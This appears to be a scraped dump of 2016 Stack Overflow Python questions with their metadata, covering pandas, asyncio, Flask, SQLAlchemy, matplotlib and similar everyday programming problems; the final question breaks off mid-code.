<p>I am trying to find a way to take 2 characters, say 'A' and 'B', and find all unique permutations of those characters into a 40 character string. Additionally - I need each character to be represented 20 times in the string. So all resulting strings each have 20 'A's and 20 'B's.</p>

<p>Like this:</p>

<pre><code>'AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB'
'AAAAAAAAAAAAAAAAAAABABBBBBBBBBBBBBBBBBBB'
'AAAAAAAAAAAAAAAAAABAABBBBBBBBBBBBBBBBBBB'
</code></pre>

<p>etc...</p>

<p>All I really need is the count of unique combinations that follow these rules. </p>

<pre><code>y=['A','A','A','A','B','B','B','B']
comb = set(itertools.permutations(y))
print(""Combinations Found: {:,}"".format(len(comb)))
</code></pre>

<p>This works, but it doesn't scale well to an input string of 20 'A's and 20 'B's. The above code takes 90 seconds to execute. Even just scaling up to 10 'A's and 10 'B's ran for 20 minutes before I killed it.</p>

<p>Is there more efficient way to approach this given the parameters I've described?</p>
"
39943765,6941106.0,2016-10-09 12:42:49+00:00,2,Remove Quotation marks from a dictionary,"<p>I have a dictionary of bigrams, obtained by importing a csv and transforming it to a dictionary:</p>

<pre><code>bigram_dict = {""('key1', 'key2')"": 'meaning', ""('key22', 'key13')"": 'mean2'}
</code></pre>

<p>I want keys' dictionary to be without quotation marks, i.e.:</p>

<pre><code>desired_bigram_dict={('key1', 'key2'): 'meaning', ('key22', 'key13'): 'mean2'}
</code></pre>

<p>Would you please suggest me how to do this?</p>
"
39943895,4960855.0,2016-10-09 12:58:44+00:00,2,pysphere PerformanceManager fails to get statistics of datastores,"<p>I'm trying to get statistics of vsphere datastores.</p>

<p>While I'm able to get statistics of hosts, it fails with datastores:</p>

<pre><code>from pysphere import VIServer 

server = VIServer() 
server.connect(HOST, USER, PASSWORD) 

pm = server.get_performance_manager() 

# querying hosts - works:
entities = server.get_hosts()  # returns {entity: name}
counters = pm.get_entity_counters(entities.keys()[0])  # returns {name: id}
statistics = pm.get_entity_statistic(entities.keys()[0], counters.values()[:1])

# querying datastores - doesn't work:
entities = server.get_datastores()  # returns {entity: name}
counters = pm.get_entity_counters(entities.keys()[0])  # returns {name: id}
statistics = pm.get_entity_statistic(entities.keys()[0], counters.values()[:1])
</code></pre>

<p>The last line raises the following error:</p>

<pre><code>AttributeError                            Traceback (most recent call last)
&lt;ipython-input-122-dbbb39ef8a75&gt; in &lt;module&gt;()
----&gt; 1 statistics = pm.get_entity_statistic(entities.keys()[0], counters.values()[:1])

.../python2.7/site-packages/pysphere/vi_performance_manager.pyc in get_entity_statistic(self, entity, counters, interval, composite)
    183 
    184             instance_name = str(stat.Id.Instance)
--&gt; 185             stat_value = str(stat.Value[0])
    186             date_now = datetime.datetime.utcnow()
    187             statistics.append(EntityStatistics(entity, stat.Id.CounterId, cname,

.../python2.7/site-packages/pysphere/ZSI/generate/pyclass.pyc in get(self)
    146         if not callable(what):
    147             def get(self):
--&gt; 148                 return getattr(self, what.aname)
    149 
    150             if what.maxOccurs &gt; 1:

AttributeError: 'DynamicData_Holder' object has no attribute '_value'
</code></pre>

<p>It seems the pysphere repository has been inactive for around 3 years now, and I couldn't find discussions mentioning this specific issue except for this:
<a href=""https://groups.google.com/forum/#!topic/pysphere/LQaF661msoQ"" rel=""nofollow"">https://groups.google.com/forum/#!topic/pysphere/LQaF661msoQ</a></p>

<p>Unfortunately this solution doesn't cover the desired statistics but only simple stats of the current moment.</p>

<p>I also found a similar error reported, but it wasn't really addressed as far as I understand:
<a href=""https://github.com/itnihao/pysphere/issues/60"" rel=""nofollow"">https://github.com/itnihao/pysphere/issues/60</a></p>

<p>Any help would be greatly appreciated.</p>
"
39858364,5936342.0,2016-10-04 17:28:12+00:00,2,Stored salted token and token comparison,"<p>I'm generating an url composed of a single use token, and sending it to a user by e-mail. The user should click this link and be redirected to a page which will validate the token and do some actions. </p>

<p>On the database side, I'm storing this token (hashed and salted, for security reasons). The problem is I'm having some difficulties to validate the the token because, the way I'm storing it, I cannot generate the same salt for the same token. And, therefore, I cannot compare this salt with the ones I have stored.</p>

<pre><code># Retrieving or creating object usertokens
usr, created = UserToken.objects.get_or_create(email=email)
# Adding a new token
token = uuid.uuid4().hex
usr.token = make_password(token) # Stores in the local database the salted and hashed token
usr.save()
</code></pre>

<p>This make_password method I'm using is defined in <code>django.contrib.auth.hashers</code>.</p>

<p>By using this method, I cannot generate two times the same salt from the same token.</p>

<pre><code>&gt;&gt;&gt; token = 'test'
&gt;&gt;&gt; enc_token1 = make_password(token)
&gt;&gt;&gt; enc_token2 = make_password(token)
&gt;&gt;&gt; enc_token1 == enc_token2
False
</code></pre>

<p>This, however, does not help me to retrieve from my database the entry corresponding to the token and I cannot validate it.</p>
"
39944494,3628460.0,2016-10-09 14:08:18+00:00,2,Render italic text in pygame,"<p>I want to write italic text with pygame. The pygame.font documentation says that one shouldn't use set_italic() and rather load a true italic font. I checked the fonts available to pygame and there weren't any that said ""italic"" in the name or anything. So I was wondering how I can find out what fonts I use for writing italic text or load them, because I don't know how they're called.</p>
"
39858238,6505286.0,2016-10-04 17:20:43+00:00,2,How can i save RDD to a single parquet file?,"<p>I work with pyspark 2.0, hadoop 2.7.2.
And here is my code:</p>

<pre><code>def func(df):
    new_df = pd.DataFrame(df['id'])
    new_df['num'] = new_df['num'] * 12
    return new_df

set = sqlContext.read.parquet(""data_set.parquet"")
columns = set.columns
map_res = set.rdd.mapPartitions(lambda iter_: func(pd.DataFrame(list(iter_), 
                                                   columns=columns)))
</code></pre>

<p>Now, I need to save <strong>map_res</strong> RDD as a parquet file <em>new.parquet</em>. 
Is there any way i can do it without creating a large dataframe before the saving? Or may be there is a possibility of saving each partition of RDD separately and then merge all saved files?</p>

<p>P.s. I want to manage without creating a dataframe due to its realy large size.</p>
"
39857796,6922035.0,2016-10-04 16:51:40+00:00,2,use asyncio update some data timely and present via aiohttp?,"<p>I am in trying to write a snippet to study Python asyncio. The basic idea is:</p>

<ol>
<li><p>use a ""simple"" web server (aiohttp) to present some data to user   </p></li>
<li><p>the data return to user will change promptly</p></li>
</ol>

<p>here is the code:</p>

<pre><code>import asyncio
import random
from aiohttp import web

userfeed = [] # the data suppose to return to the user via web browsers 

async def data_updater():  #to simulate data change promptly
    while True:
        await asyncio.sleep(3)
        userfeed = [x for x in range(random.randint(1, 20))]
        print('user date updated: ', userfeed)


async def web_handle(request):
    text = str(userfeed)
    #print('in handler:', text)  # why text is empty?
    return web.Response(text=text)

async def init(loop):
    app = web.Application(loop=loop)
    app.router.add_route('GET', '/', web_handle)
    srv = await loop.create_server(app.make_handler(), '127.0.0.1', 8000)
    print('Server started @ http://127.0.0.1:8000...')
    return srv

loop = asyncio.get_event_loop()
asyncio.ensure_future(data_updater())  
asyncio.ensure_future(init(loop))
loop.run_forever()
</code></pre>

<p>the problem is, the code is running (python 3.5), but the <code>userfeed</code> is always empty in browsers and also in <code>web_handler()</code> :-(</p>

<ol>
<li>why <code>userfeed</code> is not been updated?</li>
<li>regarding this <code>timely date update</code> function, because the update mechanism might be more complex later say async IO wait may be involved, is there a better way instead of using <code>while True: await asyncio.sleep(3)</code> in <code>data_updater()</code> to get ""more roughly precise"" timer? </li>
</ol>
"
39945178,194000.0,2016-10-09 15:19:34+00:00,2,Why does `set_index` create an index label for the column name?,"<p>I have a CSV file which begins like this:</p>

<pre><code>Year,Boys,Girls
1996,333490,315995
1997,329577,313518
1998,325903,309998
</code></pre>

<p>When I read it into pandas and set an index, it isn't doing quite what I expect:</p>

<pre><code>df = pd.read_csv('../data/myfile.csv')
df.set_index('Year', inplace=True)
df.head()
</code></pre>

<p>Why is there an index entry for the column label, with blank values next to it? Shouldn't this simply disappear?</p>

<p><a href=""http://i.stack.imgur.com/6pkxa.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/6pkxa.png"" alt=""enter image description here""></a></p>

<p>Also, I'm not clear on how to retrieve the values for 1998. If I try <code>df.loc['1998']</code> I get an error: <code>KeyError: 'the label [1998] is not in the [index]'</code>.</p>
"
39857691,4251877.0,2016-10-04 16:44:48+00:00,2,Python array_flip analogue or best way to do this?,"<p>Is there array_flip (php) analogue for Python 3.x? </p>

<p>from</p>

<pre><code>obj = ['a', 'c', 'b' ]
</code></pre>

<p>to </p>

<pre><code>{'a': 1, 'c':2, 'b': 3}
</code></pre>
"
39857515,268977.0,2016-10-04 16:32:42+00:00,2,Google App Engine urlfetch DeadlineExceededError in push task handler running apiclient batch request,"<p>I have a task handler that is making a batch request to the Google Calendar API. After 5 seconds, the request fails with <em>DeadlineExceededError: The API call urlfetch.Fetch() took too long to respond and was cancelled.</em>  I have changed <code>urlfetch.set_default_fetch_deadline(60)</code> near where I make the batch request, as suggested <a href=""http://stackoverflow.com/questions/13051628/gae-appengine-deadlineexceedederror-deadline-exceeded-while-waiting-for-htt"">here</a> but it does not seem to make a difference: the deadline seems to remain 5 seconds.</p>

<p>I am using the Python Google API Client library which sits on top of oauth2client and httplib2. But my understanding is that GAE intercepts the underlying calls to use urlfetch.Fetch. This is what the stack trace seems to show as well. </p>

<p>Can you see any reason why <code>urlfetch.set_default_fetch_deadline</code> does not seem to be working?</p>

<h2>EDIT:</h2>

<p>This is the code used to build the batch request:</p>

<pre><code># note `http` is a oauth2client authorized http client
cal = apiclient.discovery.build('calendar','v3',http=http)
req = cal.new_batch_http_request(callback=_callback)
for event in events:   # anything larger than ~5 events in batch takes &gt;5 secs
  req.add( 
    cal.events().patch(calendarId=calid, eventId=event[""id""], body=self._value) 
  )
urlfetch.set_default_fetch_deadline(60)  # has no effect
req.execute()
</code></pre>
"
39945615,6917599.0,2016-10-09 16:02:32+00:00,2,"Converting input string of integers to list, then to ints in python?","<p>I want the user to input an integer (6 digits long, so 123456 rather than just 1), and then convert that input into a list, <code>[1,2,3,4,5,6]</code>.</p>

<p>I tried this:</p>

<pre><code>user_input = list(input(""Please enter an 8 digit number"")
numbers = [int(i) for i in user_input]
</code></pre>

<p>I want to be able to perform mathematical stuff with the numbers list, but I keep getting the error ""int is not iterable"". To be frank, I'm not entirely sure what I'm doing, or sure that the ""numbers = [...] "" is even necessary, or if it should just be <code>numbers = user_input</code>. Trying <code>numbers = [i for i in user_input]</code> gets the same error.</p>

<p>Also, I realise I could either run a loop to get each number from the user, or ask them to use commas in between each in order to use the <code>.split("","")</code>, but I'd rather not as it seems messy to the user.</p>

<p>Edit: I've been switching things between versions, so sorry for any confusion. This was written in 2.7, though I intend to use Python 3.</p>
"
39857148,1510846.0,2016-10-04 16:11:55+00:00,2,Dropping multilevel columns from lists of dictionaries in pandas,"<p>I have a dataframe with multilevel columns, like the one in the following MWE:</p>

<pre><code>df = pd.DataFrame([[1,2],[3,4]], columns=[['a','c'],['b','d']], index=['one','two'])
df.columns.names = ['aa', 'bb']
</code></pre>

<p>Which looks like this:</p>

<pre><code>In [267]: df
Out[267]: 
aa   a  c
bb   b  d
one  1  2
two  3  4
</code></pre>

<p>I also have a list of dictionaries like the following:</p>

<pre><code>to_keep = [{'aa':'a', 'bb':'b'}, {'aa':'q', 'bb':'d'}]
</code></pre>

<p>What I'm looking to do:</p>

<p>If the multilevel column labels are in the <code>to_keep</code> list then keep them in <code>df</code>, otherwise drop them from the df.</p>

<p>So for <code>df</code> and <code>to_keep</code> above the resulting dataframe would look like:</p>

<pre><code>aa   a
bb   b
one  1
two  3
</code></pre>

<p>as <code>{'aa':'c', 'bb':'d'}</code> is not contained within <code>to_keep</code>. Is this possible?</p>
"
39946538,6341182.0,2016-10-09 17:38:00+00:00,2,Regular Expression to replace dot with space before parentheses,"<p>I am working on some customer comments that some of them did not follow grammatical rules. For Example <code>(Such as s and b.)</code> in the following text that provides more explanation for previous sentence is surrounded by two dots. </p>

<pre><code>   text = ""I was initially scared of ANY drug after my experience. But about a year later I tried. (Such as s and b.). I had a very bad reaction to this.""
</code></pre>

<p>First, I want to find <code>. (Such as s and b.).</code> and then  replace the  dot before <code>(Such as s and b.)</code> to space. This is my code, but it does not work. </p>

<pre><code>text = re.sub (r'(\.)(\s+?\(.+\)\s*\.)', r' \2 ', text )
</code></pre>

<p>Output should be: </p>

<pre><code> ""I was initially scared of ANY drug after my experience. But about a year later I tried  (Such as s and b.). I had a very bad reaction to this.""
</code></pre>

<p>I am using python.</p>
"
39946666,2109064.0,2016-10-09 17:50:38+00:00,2,Descriptor protocol implementation of property(),"<p>The Python <a href=""https://docs.python.org/3.5/howto/descriptor.html#properties"" rel=""nofollow"">descriptor How-To</a> describes how one could implement the <code>property()</code> in terms of descriptors. I do not understand the reason of the first if-block in the <code>__get__</code> method. Under what circumstances will <code>obj</code> be <code>None</code>? What is supposed to happen then? Why do the <code>__get__</code> and <code>__del__</code> methods not check for that?</p>

<p>Code is a bit lengthy, but it's probably better to give the full code rather than just a snippet. Questionable line is marked.</p>

<pre><code>class Property(object):
    ""Emulate PyProperty_Type() in Objects/descrobject.c""

    def __init__(self, fget=None, fset=None, fdel=None, doc=None):
        self.fget = fget
        self.fset = fset
        self.fdel = fdel
        if doc is None and fget is not None:
            doc = fget.__doc__
        self.__doc__ = doc

    def __get__(self, obj, objtype=None):
        # =====&gt;&gt;&gt; What's the reason of this if block? &lt;&lt;&lt;=====
        if obj is None:
            return self
        if self.fget is None:
            raise AttributeError(""unreadable attribute"")
        return self.fget(obj)

    def __set__(self, obj, value):
        if self.fset is None:
            raise AttributeError(""can't set attribute"")
        self.fset(obj, value)

    def __delete__(self, obj):
        if self.fdel is None:
            raise AttributeError(""can't delete attribute"")
        self.fdel(obj)

    def getter(self, fget):
        return type(self)(fget, self.fset, self.fdel, self.__doc__)

    def setter(self, fset):
        return type(self)(self.fget, fset, self.fdel, self.__doc__)

    def deleter(self, fdel):
        return type(self)(self.fget, self.fset, fdel, self.__doc__)
</code></pre>
"
39855697,6921613.0,2016-10-04 15:01:38+00:00,2,Python sum array of objects into objects,"<p>I have a list (name=carpet) of objects type mini_carpet.
Mini_carpet contains a list of objects called packages.
Packages has various properties, the one interesting to me is nr_buys.</p>

<p>What I want to do is to sum the various nr_buys that are within a mini_carpet, within a carpet.
This is what I have done so far:</p>

<pre><code>for d in range(0, carpet.__len__() - 1, +1):
nr_total = sum(carpet[d].packages[i].nr_buys for i in carpet[d].packages)
</code></pre>

<p>This is giving me an error because list indices must be integers.
Any help?</p>

<p>Thanks! </p>
"
39855525,6044529.0,2016-10-04 14:54:25+00:00,2,List comprehension confusion,"<p>I'm slightly confused by a problem that I'm having and wondered if anyone could help (it seems trivial in my mind so I hope that it genuinely is!)</p>

<p>Basically, I have filtered by a list via the following list comprehension:</p>

<pre><code>depfilt = [s for s in department if 'author' not in s]
</code></pre>

<p>(where department had 154 elements and the resulting depfilt has 72 elements)</p>

<p>Now, I also had a separate list of iD values with 154 elements (<code>subj</code>), for which the indices of this list match those in <code>department</code>. I wanted to retain the correct iD values after the filtering process so used the following line of code:</p>

<pre><code>subfilt = [s for s in subj if 'author' not in department[subj.index(s)]]
</code></pre>

<p>In my mind, I feel this should've worked, but subfilt is actually returning 106 list elements, rather than 72.</p>

<p>Does anybody have any idea why?</p>

<p>Thanks</p>
"
39855410,480441.0,2016-10-04 14:49:58+00:00,2,Is python tuple assignment order fixed?,"<p>Will</p>

<pre><code>a, a = 2, 1
</code></pre>

<p>always result in a equal to 1? In other words, is tuple assignment guaranteed to be left-to-right?</p>

<p>The matter becomes relevant when we don't have just a, but a[i], a[j] and i and j may or may not be equal.</p>
"
39946798,6908374.0,2016-10-09 18:02:38+00:00,2,finding pattern within csv file,"<p>I have a CSV Excel file example:</p>

<pre><code>Receipt Name    Address      Date       Time    Items
25007   A      ABC pte ltd   4/7/2016   10:40   Cheese, Cookie, Pie
.
.
25008   B      CCC pte ltd   4/7/2016   12:40   Cheese, Cookie
</code></pre>

<p>What is a simple way to compare the 'Items' column and find out the most common pattern of the items people buy together and display the top combinations?
In this case the similar pattern is Cheese, Cookie.</p>
"
39840638,279858.0,2016-10-03 21:24:05+00:00,2,Update mayavi plot in loop,"<p>What I want to do is to update a mayavi plot in a loop. I want the updating of the plot to be done at a time specified by me (unlike, e.g., the animation decorator).</p>

<p>So an example piece of code I would like to get running is:</p>

<pre><code>import time
import numpy as np
from mayavi import mlab

V = np.random.randn(20, 20, 20)
s = mlab.contour3d(V, contours=[0])

for i in range(5):

    time.sleep(1) # Here I'll be computing a new V

    V = np.random.randn(20, 20, 20)

    # Update the plot with the new information
    s.mlab_source.set(scalars=V)
</code></pre>

<p>However, this doesn't display a figure. If I include <code>mlab.show()</code> in the loop, then this steals the focus and doesn't allow the code to continue.</p>

<p>I feel what I should be using is a <em>traits</em> figure (e.g. <a href=""http://docs.enthought.com/mayavi/mayavi/building_applications.html"" rel=""nofollow"">this</a>). I can follow the example traits application to run a figure which live-updates as I update the sliders. However, I can't get it to update when my code asks it to update; the focus now is 'stolen' by <code>visualization.configure_traits()</code>.</p>

<p>Any pointers, or a link to appropriate documentation, would be appreciated.</p>

<hr>

<p><strong>EDIT</strong></p>

<p>David Winchester's answer gets a step closer to the solution. </p>

<p>However, as I point out in the comments, I am not able to manipulate the figure with the mouse during the <code>time.sleep()</code> step. It is during this step that, in the full program, the computer will be busy computing the new value of V. During this time I would like to be able to manipulate the figure, rotating it with the mouse etc.</p>
"
39840625,6913219.0,2016-10-03 21:23:00+00:00,2,Python - Need to extract the first and last letter from a word string,"<p>I've been stuck with this for a while. basically the <code>get_text_value(text)</code> code below is passed a string of words and it extracts the first and last letter of each word, matches it up with <code>letter_values</code> and gives the final value based on the sum of the numbers the first and last words matched up with. So far I've only been able to ""extract"" the first and last letter of the whole string and not each individual word. 
I know I'm meant to convert the string into a list, but I'm not entirely sure how to go about it. Any help would be greatly appreciated. Thanks!</p>

<pre><code>def get_text_value(text):
     letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
     letter_values = [1, 4, 2, 3, 1, 4, 3, 4, 1, 7, 7, 4, 6, 6, 1, 3, 9, 2, 2, 2, 1, 8, 5, 9, 9, 9]
     text_value = 0
     text = text.lower()
     for i in text:
          if text[0] and text[-1] in letters:
               letters_index_1 = letters.index(text[0])
               letters_index_2 = letters.index(text[-1])
               text_value = letter_values[letters_index_1] + letter_values[letters_index_2]

     return text_value

def test_get_text_value():
     print(""1. Text value:"", get_text_value(""abracadabra"")) 
     print(""2. Text value:"", get_text_value(""a b""))
     print(""3. Text value:"", get_text_value(""enjoy Today""))
     print(""4. Text value:"", get_text_value(""""))

     text = ""Be yourself everyone else is already taken""
     text_value = get_text_value(text)
     print(""6. Text:"", text)
     print(""6. Text value:"", text_value)
</code></pre>
"
39959206,609782.0,2016-10-10 13:15:39+00:00,2,Save a subset of MongoDB(3.0) collection to another collection in Python,"<p>I found this answer - <a href=""http://stackoverflow.com/a/25247084/609782"">Answer link</a></p>

<pre><code>db.full_set.aggregate([ { $match: { date: ""20120105"" } }, { $out: ""subset"" } ]);
</code></pre>

<p>I want do same thing but with first 15000 documents in collection, I couldn't find how to apply limit to such query (I tried using <code>$limit : 15000</code>, but it doesn't recognize $limit)</p>

<p>also when I tried - </p>

<pre><code>db.subset.insert(db.full_set.find({}).limit(15000).toArray())
</code></pre>

<p>there is no function <code>toArray()</code> for output type <code>cursor</code>.
<br><br>Guide me how can I accomplish it?</p>
"
39822159,4397827.0,2016-10-02 22:01:51+00:00,2,Index out of range using Flask/Python,"<p>I am working on a web app and running into some issues with the following code. I have a database where I need to update a value. When I try to update the value I am getting an index out of range error, however when I run the code with just python not using the web part it runs and performs as expected.. I cannot figure out what is changing when I try it in part with flask and an HTML form. Here is my code to update the database;</p>

<p>EDIT:: After more testing it seems there is some issue with the form pushing the data I need back to /poplesson. If change these lines;</p>

<pre><code>user_id = request.form['clientid']
pck_id = request.form['packageid']
</code></pre>

<p>to</p>

<pre><code>user_id = 1
pck_id = 1
</code></pre>

<p>it will work as planned, however that is not what I need as I need those ID's to be pulled from the DB.</p>

<pre><code>@app.route(""/poplesson"", methods=['GET', 'POST'])
def poplesson():
if request.method == 'GET':
    return render_template('view_packages.html')
elif request.method == 'POST':
    con = sqlite3.connect('utpg.db')
    db = con.cursor()
    user_id = request.form['clientid']
    pck_id = request.form['packageid']
    package = db.execute(""SELECT * FROM packages WHERE client_id = ?;"", (user_id, ))
    result = package.fetchall()
    privatelessons = result[0][4] ##Without flask this run, with flask this  throws an index error.
    pop = privatelessons - 1
    db.execute(""UPDATE packages SET privatelesson = ? WHERE client_id = ? AND pck_id = ?;"", (pop, user_id, pck_id, ))
    con.commit()
    return render_template('view_packages.html')
</code></pre>

<p>This is the code I am using to display the HTML and get the value from the forms..</p>

<pre><code>&lt;table&gt;
{% for col in items %}
&lt;tr&gt;
&lt;td&gt;{{ col['pck_id'] }}&lt;/td&gt;
&lt;td&gt;{{ col['client_id'] }}&lt;/td&gt;
&lt;td&gt;{{ col['date'] }}&lt;/td&gt;
&lt;td&gt;{{ col['price'] }}&lt;/td&gt;
&lt;td&gt;{{ col['privatelesson'] }}&lt;/td&gt;
&lt;td&gt;{{ col['shortgamelesson'] }}&lt;/td&gt;
&lt;td&gt;{{ col['playinglesson'] }}&lt;/td&gt;
&lt;td&gt;{{ col['notes'] }}&lt;/td&gt;
&lt;td&gt;&lt;form class=""form-container"" action=""/deletepackage"" method=""POST""&gt;
&lt;input class=""form-field""  value=""{{ col['pck_id'] }}"" name=""packageid"" /&gt;  &lt;br /&gt;
    &lt;input class=""submit-button"" type=""submit"" value=""DELETE Package"" /&gt;  &lt;/form&gt;
 &lt;/td&gt;
 &lt;td&gt;&lt;form class=""form-container"" action=""/poplesson"" method=""POST""&gt;
 &lt;input class=""form-field""  value=""{{ col['client_id'] }}"" name=""clientid"" /&gt;  &lt;br /&gt;
    &lt;input class=""form-field""  value=""{{ col['pck_id'] }}"" name=""packageid"" /&gt;
    &lt;input class=""submit-button"" type=""submit"" value=""Subtract Private Lesson"" /&gt;&lt;/form&gt;&lt;/td&gt;
&lt;/tr&gt;
{% endfor %}
&lt;/table&gt;
&lt;/body&gt;
</code></pre>

<p>if I do just this part in python, it runs as expected and using a DB viewed I can see the DB is updated. Any thoughts?</p>

<pre><code>    con = sqlite3.connect('utpg.db')
    db = con.cursor()
    user_id = request.form['clientid']
    pck_id = request.form['packageid']
    package = db.execute(""SELECT * FROM packages WHERE client_id = ?;"", (user_id, ))
    result = package.fetchall()
    privatelessons = result[0][4] ##Without flask this run, with flask this  throws an index error.
    pop = privatelessons - 1
    db.execute(""UPDATE packages SET privatelesson = ? WHERE client_id = ? AND pck_id = ?;"", (pop, user_id, pck_id, ))
    con.commit()
</code></pre>
"
39820443,6287280.0,2016-10-02 18:48:53+00:00,2,C# - Using method from a Python file,"<p>I have two files, a regular python (.py) file and a visual studio C# file (.cs). I want to use a function in the python file which returns a string and use that string in the C# file. </p>

<p>Basically:</p>

<pre><code>#This is the Python file!
def pythonString():
   return ""Some String""
</code></pre>

<p>and</p>

<pre><code>//This is the C# file!
namespace VideoLearning
{
    string whatever = pythonString(); // This is from the Python file.
}
</code></pre>

<p>How can I sort of link these two files together? Thanks.</p>
"
39971999,259130.0,2016-10-11 07:05:42+00:00,2,Selenium Phantomjs browsers hangs on startup. How do I debug it?,"<p>I'm trying to help run my selenium (Python bindings version 2) tests on someone else setup. </p>

<p>It works with the Firefox esr(on both machines), it works with the latest phantomjs on my machine. It hangs on his machine.</p>

<p>Only obvious difference between is he's on Windows 10 and I'm on Windows 7. I don't think it's the firewall or proxy cause I took care of it ( enabling everything for the firewall and running it with <code>--proxy-type=none</code>).</p>

<p>How do I debug it?</p>
"
39971625,4786305.0,2016-10-11 06:35:49+00:00,2,How to show yticks on the plot/graph (not on y-axis). Show yticks near points,"<p>I have a plot with a simple line. For the moment, I set <strong>yticks</strong> as invisible.
<a href=""http://i.stack.imgur.com/EaW9w.jpg"" rel=""nofollow""><img src=""http://i.stack.imgur.com/EaW9w.jpg"" alt=""enter image description here""></a></p>

<p>Here is the code for the graph:</p>

<pre><code>import matplotlib.pyplot as plt
x = [1, 2, 3, 4, 5]
y = [1, 1.5, 2, 2.5, 3]

fig, ax = plt.subplots(figsize=(15,10))
plt.plot(x, y, 'ko-')

plt.xlabel('X', fontsize=15)
plt.ylabel('Y', fontsize=15)
plt.xticks(x, fontsize=13)
plt.yticks(y, visible=False)

plt.margins(0.1, 0.1)
plt.title('Graph', color='black', fontsize=17) 
ax.axis('scaled') 
ax.grid()
plt.show()
</code></pre>

<hr>

<p>I need to show/print <strong>yticks</strong> right on the graph itself (not on the left side). So, <strong>yticks</strong> are alongside with datapoints.</p>

<p><strong>Desired output:</strong>
<a href=""http://i.stack.imgur.com/vvfCm.jpg"" rel=""nofollow""><img src=""http://i.stack.imgur.com/vvfCm.jpg"" alt=""enter image description here""></a></p>

<hr>

<p>How to do it with <strong>Matplotlib</strong>?</p>
"
39821687,6764079.0,2016-10-02 21:04:11+00:00,2,Testing a time-dependent method,"<p>I have a method that takes a datetime and returns what period of time this datetime belongs to, for example ""yesterday"" or ""a month ago"".</p>

<pre><code>from datetime import datetime


def tell_time_ago(basetime):
    difference = datetime.now() - basetime

    days = difference.days
    seconds = difference.seconds
    hours = seconds / 3600
    minutes = seconds / 60

    if days and days == 1:
        return 'Yesterday'
    elif days and days != 1 and days &lt; 7:
        return '%s days ago' % days
    elif days and days != 1 and 7 &lt; days &lt; 31:
        return 'Within this month'
    elif days and days != 1 and 30 &lt; days &lt; 365:
        return '%s months ago' % (days / 30)
    elif days and days != 1 and 365 &lt;= days &lt; 730:
        return 'A year ago'
    elif days and days != 1 and days &gt;= 730:
        return '%s years ago' % (days / 365)

    elif hours and hours == 1:
        return 'An hour ago'
    elif hours and hours != 1:
        return '%s hours ago' % hours

    elif minutes and minutes == 1:
        return 'A minute ago'
    elif minutes and minutes != 1:
        return '%s minutes ago' % minutes

    elif seconds and seconds == 1:
        return 'A second ago'
    elif seconds and seconds != 1:
        return '%s seconds ago' % seconds

    else:
        return '0 second ago'
</code></pre>

<p>I want to extend this method so I'm going to write tests for it. If want to write a test for this method, should I change the current date of system to a specific date and revert it back to normal every time, so the test won't fail just because the date is changed? For example:</p>

<pre><code>class TestCase(unittest.TestCase):
    def test_timedelta(self):
        a_year_ago = datetime(2015, 5, 12, 23, 15, 15, 53000)
        assert tell_time_ago(a_year_ago) == 'A year ago'
</code></pre>

<p>If I run this test two years from now, it will fail. What is the best approach?</p>
"
39821866,6826422.0,2016-10-02 21:25:57+00:00,2,How to use collection_class in SQLAlchemy?,"<p>I am trying to model hierarchical and historical relations between institutional actors in SQLAlchemy (i.e. an Institution can have parents/children and predecessors/successors). What I have so far largely follows the <a href=""http://docs.sqlalchemy.org/en/latest/_modules/examples/graphs/directed_graph.html"" rel=""nofollow"">directed graph example</a> in the SQLAlchemy docs. Now I would like to be able to access left/right neighbors to the nodes in a dictionary with <code>edge_type</code> as key and a list of nodes as values, like this: <code>node.right_nodes['edge_type']</code>.</p>

<p>I think this can be done with collection_class, but using <code>collection_class=attribute_mapped_collection('edge_type')</code> only results in one single key:value pair and not a key:[list of values].</p>

<p>Actual result:</p>

<pre><code>&gt;&gt;&gt; node.right_edges['edge_type']
&lt;Edge object&gt;
&gt;&gt;&gt; node.right_nodes['edge_type']
&lt;Node object&gt;
</code></pre>

<p>Expected result:</p>

<pre><code>&gt;&gt;&gt; node.right_edges['edge_type']
[&lt;Edge object&gt;, &lt;Edge object&gt;]
&gt;&gt;&gt; node.right_nodes['edge_type']
[&lt;Node object&gt;, &lt;Node object&gt;]
</code></pre>

<p>The model looks like this:</p>

<pre><code>from sqlalchemy import (Column, Integer, String, ForeignKey,
                        create_engine)
from sqlalchemy.orm import Session, relationship, backref
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.ext.associationproxy import association_proxy
from sqlalchemy.orm.collections import attribute_mapped_collection


Base = declarative_base()


class Node(Base):
    __tablename__ = 'node'

    id = Column(Integer, primary_key=True)
    name = Column(String, nullable=False)

    left_nodes = association_proxy('left_edges', 'left_node')
    right_nodes = association_proxy('right_edges', 'right_node')


class Edge(Base):
    __tablename__ = 'edge'

    left_node_id = Column(Integer, ForeignKey('node.id'), primary_key=True)
    right_node_id = Column(Integer, ForeignKey('node.id'), primary_key=True)
    edge_type = Column(String)

    left_node = relationship(
        Node,
        foreign_keys=left_node_id,
        backref=backref(
            'right_edges',
            collection_class=attribute_mapped_collection('edge_type')
        )
    )

    right_node = relationship(
        Node,
        foreign_keys=right_node_id,
        backref=backref(
            'left_edges',
            collection_class=attribute_mapped_collection('edge_type')
        )
    )
</code></pre>

<p>Used like this:</p>

<pre><code>engine = create_engine('sqlite://', echo=True)
Base.metadata.create_all(engine)
session = Session(engine)

n1 = Node(name='LeftNode')
n2 = Node(name='RightNode1')
n3 = Node(name='RightNode2')
Edge(left_node=n1, right_node=n2, edge_type='hierarchy')
Edge(left_node=n1, right_node=n3, edge_type='hierarchy')
session.add_all([n1, n2, n3])
session.commit()

print(n1.right_nodes)  # returns dict with 1 node as value
print(n1.right_nodes['hierarchy'])  # returns 1 node
print(n1.right_edges)  # returns dict with 1 edge as value
print(n1.right_edges['hierarchy'])  # returns 1 edge
print(session.query(Edge).filter_by(left_node=n1).all())  # returns list of 2 edges
</code></pre>

<p><strong>Edit:</strong></p>

<p>The following is not an answer to my question, but to document what I have so far.</p>

<p><code>association_proxy</code> not only takes fields as the target, but you can also define properties in the target class:</p>

<pre><code>class Node(Base):

    # &lt;snip&gt;

    left_nodes = association_proxy('left_edges', 'left_nodes_edge_type')
    right_nodes = association_proxy('right_edges', 'right_nodes_edge_type')


class Edge(Base):

    # &lt;snip&gt;

    @property
